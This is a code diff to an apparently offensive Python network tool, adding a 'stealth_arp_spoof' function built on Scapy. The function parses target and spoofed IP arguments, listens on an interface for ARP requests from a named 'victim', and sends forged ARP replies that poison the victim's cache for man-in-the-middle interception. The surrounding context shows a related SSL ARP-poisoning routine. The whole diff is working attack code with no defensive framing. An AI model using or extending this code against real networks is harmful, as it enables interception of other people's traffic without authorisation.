@@ -83,6 +83,31 @@ def start_arp_poison_ssl(cmd):
     start_arp_thread(target_ip, spoofed_ip, 5)
     start_arp_thread(spoofed_ip, target_ip, 5)
     
-    
 
+def stealth_arp_spoof(cmd):
+    args = shlex.split(cmd)
+    target_ip = spoofed_ip = interface = None
 
+    for i, arg in enumerate(args):
+        if arg == "-tgtip" and i + 1 < len(args):
+            target_ip = args[i + 1]
+        elif arg == "-spip" and i + 1 < len(args):
+            spoofed_ip = args[i + 1]
+        elif arg == "-iface" and i + 1 < len(args):
+            interface = args[i + 1]
+
+    if not target_ip or not spoofed_ip:
+        print("[!] Usage: stealth_arp -tgtip <target_ip> -spip <spoofed_ip> [-iface <interface>]")
+        return
+
+    def arp_sniffer(packet):
+        if packet.haslayer(sc.ARP):
+            arp = packet[sc.ARP]
+            if arp.op == 1 and arp.psrc == target_ip and arp.pdst == spoofed_ip:
+                print(f"[+] Victim {target_ip} requested {spoofed_ip}. Sending spoofed reply.")
+                reply = sc.ARP(op=2, pdst=target_ip, hwdst=arp.hwsrc, psrc=spoofed_ip)
+                sc.send(reply, verbose=False)
+
+    iface = interface or sc.conf.iface
+    print(f"[!] Listening on interface '{iface}' for ARP requests from {target_ip} about {spoofed_ip}...")
+    sc.sniff(filter="arp", prn=arp_sniffer, store=False, iface=iface)
